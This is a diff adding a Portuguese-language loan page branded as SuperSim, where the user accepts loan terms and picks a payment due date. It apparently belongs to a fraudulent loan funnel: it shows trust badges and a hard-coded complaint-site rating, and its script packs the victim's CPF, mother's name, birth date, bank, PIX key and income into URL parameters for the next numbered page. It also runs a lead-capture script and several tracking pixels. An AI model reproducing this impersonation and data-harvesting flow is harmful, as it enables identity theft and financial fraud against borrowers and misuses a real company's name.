@@ -1,0 +1,897 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/js/meta-pixel.js"></script><script src="/js/utmify-loader.js"></script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4371125873201817&ev=PageView&noscript=1" /></noscript>
+  <link rel="icon" type="image/png" href="images/favicon-supersim.png">
+
+
+  <script src="js/latest-6.js" async="" defer=""></script>
+  <script>
+    window.pixelId = "6a6c0cbfe2e9334e445f0bdf";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script><script async="" defer="" src="js/pixel.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Escolha o Vencimento — SuperSim</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap');
+
+    :root {
+      --green: #7c5914;
+      --green-dark: #624710;
+      --green-light: #f6f2e9;
+      --green-subtle: #faf8f2;
+      --bg: #f7f6f4;
+      --card: #FFFFFF;
+      --text: #201c18;
+      --text-mid: #4b453d;
+      --text-light: #7d776e;
+      --border: #ebe9e5;
+      --border-light: #f6f5f3;
+      --warning: #f59e0b;
+      --radius: 18px;
+      --shadow: 0 4px 24px rgba(0, 0, 0, .06), 0 1px 2px rgba(0, 0, 0, .04);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 72px;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    /* HEADER */
+    header.header {
+      background: #FFFFFF;
+      padding: 14px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 1px 0 var(--border);
+    }
+
+    .header-content {
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 550px;
+      margin: 0 auto;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .menu-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--border-light);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      border: 1px solid var(--border);
+      transition: all 0.2s ease;
+    }
+
+    .menu-icon:hover {
+      background: var(--border);
+      transform: scale(1.05);
+    }
+
+    .menu-icon svg {
+      width: 18px;
+      height: 18px;
+      color: var(--text-mid);
+      stroke-width: 2.5;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      user-select: none;
+    }
+
+    .logo-cred {
+      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
+      font-weight: 800;
+      font-size: 20px;
+      color: #201c18;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+
+    .logo-diamond {
+      width: 7px;
+      height: 7px;
+      background: #7c5914;
+      transform: rotate(45deg);
+      margin: 0 8px;
+      border-radius: 1.5px;
+      flex-shrink: 0;
+    }
+
+    .logo-on {
+      font-family: 'Sora', 'Plus Jakarta Sans', sans-serif;
+      font-weight: 800;
+      font-size: 20px;
+      color: #7c5914;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 1px;
+    }
+
+    .user-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text);
+      max-width: 120px;
+      text-overflow: ellipsis;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+
+    .user-cpf {
+      font-size: 11px;
+      color: var(--text-light);
+      letter-spacing: 0.3px;
+    }
+
+    .user-icon-wrapper {
+      width: 40px;
+      height: 40px;
+      background: var(--green-light);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid var(--green);
+      color: var(--green-dark);
+    }
+
+    .user-icon-wrapper svg {
+      width: 20px;
+      height: 20px;
+    }
+
+    /* MAIN */
+    .main-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 550px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 32px 24px;
+      border: 1px solid var(--border);
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .section {
+      display: none;
+    }
+
+    .section.active {
+      display: block;
+      animation: fadeIn 0.4s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    .section-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.4rem;
+      font-weight: 800;
+      color: var(--text);
+      margin-bottom: 10px;
+      text-align: center;
+      letter-spacing: -0.3px;
+    }
+
+    .section-subtitle {
+      font-size: 0.95rem;
+      color: var(--text-light);
+      margin-bottom: 24px;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .user-greeting {
+      color: var(--green);
+      font-weight: 700;
+    }
+
+    /* INFO CARDS */
+    .info-card {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: #fcfbfa;
+      border: 1.5px solid #ebe9e5;
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+    }
+
+    .info-icon {
+      width: 40px;
+      height: 40px;
+      min-width: 40px;
+      background: var(--green);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .info-icon svg {
+      width: 20px;
+      height: 20px;
+      color: white;
+    }
+
+    .info-icon.warning {
+      background: var(--warning);
+    }
+
+    .info-text {
+      font-size: 0.85rem;
+      color: #4b453d;
+      font-weight: 500;
+      line-height: 1.5;
+    }
+
+    .info-highlight {
+      font-weight: 700;
+      color: var(--green-dark);
+    }
+
+    /* ===== Resumo de Custo Efetivo Total (CET) ===== */
+    .cet-card{background:#fff;border:1.5px solid #ebe9e5;border-radius:14px;padding:16px 16px 14px;margin-bottom:16px;box-shadow:0 2px 10px rgba(0,0,0,.03)}
+    .cet-head{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+    .cet-head .cet-ic{width:34px;height:34px;min-width:34px;background:var(--green-light);border-radius:9px;display:flex;align-items:center;justify-content:center}
+    .cet-head .cet-ic svg{width:18px;height:18px;color:var(--green-dark)}
+    .cet-head h3{font-size:.92rem;font-weight:800;color:#201c18;margin:0;line-height:1.2}
+    .cet-head p{font-size:.7rem;color:#7d776e;margin:2px 0 0;font-weight:500}
+    .cet-row{display:flex;justify-content:space-between;align-items:baseline;padding:9px 0;border-bottom:1px dashed #efeeea;font-size:.83rem;gap:12px}
+    .cet-row .cet-l{color:#7d776e;font-weight:500}
+    .cet-row .cet-v{color:#302b26;font-weight:700;text-align:right;white-space:nowrap}
+    .cet-row.total{margin-top:4px;padding-top:12px;border-top:2px solid #efeeea;border-bottom:0}
+    .cet-row.total .cet-l{color:#201c18;font-weight:700;font-size:.9rem}
+    .cet-row.total .cet-v{color:var(--green-dark);font-weight:800;font-size:1.02rem}
+    .cet-foot{font-size:.68rem;color:#aca79f;line-height:1.5;margin-top:10px}
+
+    .info-card.warning {
+      background: #fffbeb;
+      border-color: rgba(245, 158, 11, 0.3);
+    }
+
+    .info-card.warning .info-text {
+      color: #92400e;
+    }
+
+    .info-card.warning .info-highlight {
+      color: #78350f;
+    }
+
+    /* BUTTONS */
+    .btn-grid {
+      display: grid;
+      gap: 12px;
+      margin-top: 24px;
+    }
+
+    .btn-primary {
+      width: 100%;
+      background: var(--green);
+      color: white;
+      border: none;
+      padding: 16px 24px;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(140, 103, 30, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-primary::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      0% {
+        left: -100%;
+      }
+
+      100% {
+        left: 100%;
+      }
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(140, 103, 30, 0.35);
+      background: var(--green-dark);
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    .due-date-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      padding: 18px 24px;
+      background: #fcfbfa;
+      border: 1.5px solid #ebe9e5;
+      transition: all 0.25s ease;
+    }
+
+    .due-date-btn:hover {
+      border-color: var(--green);
+      background: #faf8f2;
+    }
+
+    .due-date-number {
+      font-size: 1.8rem;
+      font-weight: 900;
+      color: var(--green);
+    }
+
+    .due-date-text {
+      text-align: left;
+      font-size: 0.9rem;
+      line-height: 1.3;
+      color: #4b453d;
+    }
+
+    /* LOADING */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      backdrop-filter: blur(4px);
+    }
+
+    .loading-overlay.show {
+      display: flex;
+    }
+
+    .loading-content {
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 300px;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid var(--green-light);
+      border-top: 6px solid var(--green);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    /* FOOTER */
+    footer.site-footer {
+      margin-top: auto;
+      background: #FFFFFF;
+      color: var(--text-light);
+      padding: 24px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      border-top: 1px solid var(--border);
+    }
+
+    .footer-inner {
+      max-width: 550px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .footer-logo {
+      display: flex;
+      align-items: center;
+      user-select: none;
+    }
+
+    .footer-logo .logo-cred {
+      font-size: 15px;
+      color: #7d776e;
+    }
+
+    .footer-logo .logo-diamond {
+      width: 5px;
+      height: 5px;
+      margin: 0 6px;
+      background: #7d776e;
+    }
+
+    .footer-logo .logo-on {
+      font-size: 15px;
+      color: #7c5914;
+    }
+
+    footer small {
+      font-size: 11px;
+      opacity: 0.75;
+      line-height: 1.5;
+    }
+
+    footer small strong {
+      color: var(--green-dark);
+      font-weight: 600;
+    }
+
+    .footer-badges {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-top: 4px;
+    }
+
+    .footer-badges span {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 10px;
+      color: #aca79f;
+      font-weight: 500;
+    }
+
+    .footer-badges svg {
+      width: 12px;
+      height: 12px;
+      color: #aca79f;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 24px 20px;
+      }
+
+      .section-title {
+        font-size: 1.25rem;
+      }
+
+      .due-date-number {
+        font-size: 1.6rem;
+      }
+
+      .btn-primary {
+        padding: 15px 20px;
+        font-size: 0.95rem;
+      }
+
+      .info-card {
+        padding: 12px 14px;
+        gap: 12px;
+      }
+
+      .info-icon {
+        width: 36px;
+        height: 36px;
+        min-width: 36px;
+      }
+
+      .info-icon svg {
+        width: 18px;
+        height: 18px;
+      }
+
+      .info-text {
+        font-size: 0.8rem;
+      }
+    }
+
+    .logo-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      user-select: none;
+      text-decoration: none;
+    }
+
+    .logo-row {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-tagline {
+      font-family: 'DM Sans', 'Poppins', sans-serif;
+      font-weight: 600;
+      font-size: 7px;
+      letter-spacing: 2.5px;
+      text-transform: uppercase;
+      color: #7d776e;
+      margin-top: 1px;
+    }
+
+    .footer-tagline {
+      font-family: 'DM Sans', 'Poppins', sans-serif;
+      font-weight: 600;
+      font-size: 6px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: #aca79f;
+      margin-top: 1px;
+    }
+  </style>
+
+<script src="js/tracking-shared.js"></script>
+</head>
+
+<body>
+  <header class="header">
+  <link rel="icon" type="image/png" href="images/favicon-supersim.png">
+
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg>
+        </div>
+        <img src="images/supersim-logo.png" alt="SuperSim" style="height:34px;width:auto;">
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Usuário</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="secure-strip" style="display:flex;align-items:center;justify-content:center;gap:6px;background:#f6f2ea;border-bottom:1px solid #ece5d6;color:#765513;font-size:11px;font-weight:600;padding:6px 12px;">
+    <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+    Conexão segura · sessão criptografada
+  </div>
+
+  <div class="main-container">
+    <div class="container">
+      <div id="aceite-secao" class="section active">
+        <h1 class="section-title">Condições do Empréstimo</h1>
+        <p class="section-subtitle">Leia atentamente antes de prosseguir</p>
+
+        <div class="info-card">
+          <div class="info-icon">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z">
+              </path>
+            </svg>
+          </div>
+          <p class="info-text">
+            Se houver atraso no pagamento das parcelas, serão aplicados juros de <span class="info-highlight">0,49% ao
+              mês</span>.
+          </p>
+        </div>
+
+        <div class="info-card warning">
+          <div class="info-icon warning">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
+              </path>
+            </svg>
+          </div>
+          <p class="info-text">
+            <span class="info-highlight">Importante:</span> O pagamento em dia evita juros e mantém seu crédito
+            saudável.
+          </p>
+        </div>
+
+        <!-- RESUMO DE CUSTO EFETIVO TOTAL -->
+        <div class="cet-card">
+          <div class="cet-head">
+            <div class="cet-ic">
+              <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 7h6m-6 4h6m-6 4h4M5 3h14a2 2 0 012 2v14a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2z"></path>
+              </svg>
+            </div>
+            <div>
+              <h3>Custo Efetivo Total (CET)</h3>
+              <p>Resumo transparente do seu contrato</p>
+            </div>
+          </div>
+          <div class="cet-row"><span class="cet-l">Valor solicitado</span><span class="cet-v" id="cetValor">R$ 5.000,00</span></div>
+          <div class="cet-row"><span class="cet-l">Parcelamento</span><span class="cet-v" id="cetParcelas">24x de R$ 230,08</span></div>
+          <div class="cet-row"><span class="cet-l">Taxa de juros</span><span class="cet-v" id="cetJuros">0,81% a.m.</span></div>
+          <div class="cet-row"><span class="cet-l">IOF</span><span class="cet-v" id="cetIof">R$ 168,65</span></div>
+          <div class="cet-row"><span class="cet-l">CET</span><span class="cet-v" id="cetCet">1,10% a.m. · 14,00% a.a.</span></div>
+          <div class="cet-row total"><span class="cet-l">Valor total a pagar</span><span class="cet-v" id="cetTotal">R$ 5.521,90</span></div>
+          <div class="cet-foot">Valores estimados com base na simulação escolhida. O CET reúne juros, tributos (IOF) e
+            encargos do contrato, conforme normas do Banco Central do Brasil.</div>
+        </div>
+        <script>
+          (function () {
+            function brl(v) { return 'R$ ' + Number(v).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
+            function pct(v) { return v.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
+            function set(id, val) { var el = document.getElementById(id); if (el) el.textContent = val; }
+            var valor = parseFloat(localStorage.getItem('selectedLoanAmount')) || 0;
+            var n = parseInt(localStorage.getItem('selectedInstallments'), 10) || 0;
+            var monthly = parseFloat(localStorage.getItem('selectedMonthlyPayment')) || 0;
+            if (!valor) valor = 5000;
+            if (!n) n = 24;
+            if (!monthly) { var i0 = 0.0081; monthly = valor * i0 / (1 - Math.pow(1 + i0, -n)); }
+            var total = monthly * n;
+            var dias = Math.min(n * 30, 365);
+            var iof = valor * 0.0038 + valor * 0.000082 * dias;
+            var liquido = Math.max(valor - iof, 1);
+            function irr(pv, pmt, np) { var lo = 0.00001, hi = 1, m = 0.01; for (var k = 0; k < 100; k++) { m = (lo + hi) / 2; var c = pv * m / (1 - Math.pow(1 + m, -np)); if (c > pmt) hi = m; else lo = m; } return m; }
+            var cetM = irr(liquido, monthly, n);
+            var cetA = Math.pow(1 + cetM, 12) - 1;
+            set('cetValor', brl(valor));
+            set('cetParcelas', n + 'x de ' + brl(monthly));
+            set('cetJuros', '0,81% a.m.');
+            set('cetIof', brl(iof));
+            set('cetCet', pct(cetM * 100) + '% a.m. · ' + pct(cetA * 100) + '% a.a.');
+            set('cetTotal', brl(total));
+          })();
+        </script>
+
+        <!-- CARNÊ (endereço coletado no chat) -->
+        <div class="carne-note" id="carneNote" style="display:none;align-items:center;gap:12px;background:#faf8f2;border:1.5px solid #e6dfcf;border-radius:14px;padding:13px 15px;margin-bottom:16px;">
+          <div style="width:38px;height:38px;min-width:38px;background:var(--green);border-radius:10px;display:flex;align-items:center;justify-content:center;">
+            <svg fill="none" stroke="#fff" stroke-width="2" viewBox="0 0 24 24" style="width:20px;height:20px;"><path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+          </div>
+          <div style="line-height:1.4;">
+            <div style="font-size:13px;font-weight:800;color:#211e1b;">Seu carnê de pagamento está a caminho 📮</div>
+            <div style="font-size:12px;color:#69645d;">Enviaremos impresso para <b id="carneAddr"></b>, com todas as parcelas.</div>
+          </div>
+        </div>
+        <script>
+          (function(){ try{ var e=localStorage.getItem('endereco_completo'); if(e){ var n=document.getElementById('carneNote'); document.getElementById('carneAddr').textContent=e; n.style.display='flex'; } }catch(_){} })();
+        </script>
+
+        <div class="btn-grid">
+          <button class="btn-primary" onclick="proximaSecao()">
+            Li e Concordo
+          </button>
+        </div>
+      </div>
+
+      <div id="vencimento-secao" class="section">
+        <h1 class="section-title">
+          Ótimo, <span class="user-greeting" id="nomeGreeting">Cliente</span>!
+        </h1>
+        <p class="section-subtitle">Agora escolha o melhor dia para o vencimento das suas parcelas</p>
+
+        <div class="btn-grid">
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(5)">
+            <span class="due-date-number">05</span>
+            <span class="due-date-text"><strong>Dia 05</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(10)">
+            <span class="due-date-number">10</span>
+            <span class="due-date-text"><strong>Dia 10</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(15)">
+            <span class="due-date-number">15</span>
+            <span class="due-date-text"><strong>Dia 15</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(25)">
+            <span class="due-date-number">25</span>
+            <span class="due-date-text"><strong>Dia 25</strong><br>Todo mês</span>
+          </button>
+          <button class="btn-primary due-date-btn" onclick="selectDueDate(30)">
+            <span class="due-date-number">30</span>
+            <span class="due-date-text"><strong>Dia 30</strong><br>Todo mês</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <p class="loading-text">Processando sua escolha...</p>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo">
+        <img src="images/supersim-logo.png" alt="SuperSim" style="height:24px;width:auto;">
+      </div>
+      <small><strong>SuperSim Soluções Financeiras S.A.</strong><br>CNPJ: 33.030.944/0001-60 – São Paulo, SP –
+        01310-200</small>
+      <div class="footer-badges">
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+            </path>
+          </svg>
+          SSL Seguro
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+            </path>
+          </svg>
+          Dados protegidos
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4">
+            </path>
+          </svg>
+          Instituição regulada
+        </span>
+      </div>
+      <div style="display:inline-flex;align-items:center;gap:7px;background:#fff;border:1px solid #e4e1db;border-radius:10px;padding:6px 11px;margin-top:14px;">
+        <span style="font-family:'Sora',sans-serif;font-weight:800;font-size:11px;color:#363330;display:inline-flex;align-items:center;">Reclame<b style="background:#9a6f19;color:#fff;padding:1px 4px;border-radius:4px;margin-left:2px;">AQUI</b></span>
+        <span style="font-size:11px;font-weight:700;color:#9a6f19;">★ 8.9 · ÓTIMO</span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    function loadUserData() {
+      const nome = localStorage.getItem('nome');
+      if (nome) {
+        const nomes = nome.trim().split(' ');
+        const primeiroNome = nomes[0];
+        const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+        document.getElementById('userName').textContent = ultimoNome ? `${primeiroNome} ${ultimoNome}` : primeiroNome;
+        document.getElementById('nomeGreeting').textContent = primeiroNome;
+      }
+
+      const cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        if (cpfLimpo.length === 11) {
+          document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
+        }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', loadUserData);
+
+    function proximaSecao() {
+      document.getElementById('aceite-secao').classList.remove('active');
+      document.getElementById('vencimento-secao').classList.add('active');
+    }
+
+    function selectDueDate(day) {
+      document.getElementById('loadingOverlay').classList.add('show');
+      localStorage.setItem('dueDate', day.toString());
+
+      const urlParams = new URLSearchParams(window.location.search);
+      urlParams.set('dueDate', day);
+
+      const importantParams = [
+        'income', 'salaryDay', 'occupation', 'education', 'utm_source', 'utm_campaign',
+        'utm_medium', 'utm_content', 'utm_term', 'name', 'email', 'document', 'nome_mae',
+        'data_nasc', 'telephone', 'telefone', 'cpf', 'nome', 'banco', 'chave_pix',
+        'selectedLoanAmount', 'selectedInstallments', 'selectedMonthlyPayment'
+      ];
+
+      importantParams.forEach(param => {
+        const value = localStorage.getItem(param);
+        if (value && !urlParams.has(param)) {
+          urlParams.set(param, value);
+        }
+      });
+
+      const finalParams = urlParams.toString();
+      const targetUrl = finalParams ? `../7/index.html?${finalParams}` : '../7/index.html';
+
+      setTimeout(() => {
+        window.location.href = targetUrl;
+      }, 1500);
+    }
+  </script>
+
+
+  <script defer="" src="v8c78df7c7c0f484497ecbca7046644da1771523124516-6" data-cf-beacon="{" version":"2024.11.0","token":"291788ee003a413395b0add202b81cef","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+  <script src="js/front-boost.js" defer=""></script>
+<style id="brandCTA">
+.btn-primary,.btn-submit,.cta-button{background:linear-gradient(135deg,#ff9e1b,#d9760a)!important;box-shadow:0 16px 30px -12px rgba(240,144,15,.5),inset 0 1px 0 rgba(255,255,255,.3)!important;color:#fff!important;border:none!important}
+</style>
+
+<script src="js/lead-capture.js"></script><script>(function(){try{var p=location.pathname,s=null;if(/(^|\/)4\.html/.test(p))s="termos";else if(/(^|\/)9\.html/.test(p)||/\/up\d+/.test(p)||/checkout/i.test(p))s="checkout";if(s){var n=0,t=setInterval(function(){if(window.arxLead){clearInterval(t);window.arxLead.save({},s);}else if(++n>50){clearInterval(t);}},60);}}catch(e){}})();</script>
+
+</body></html>
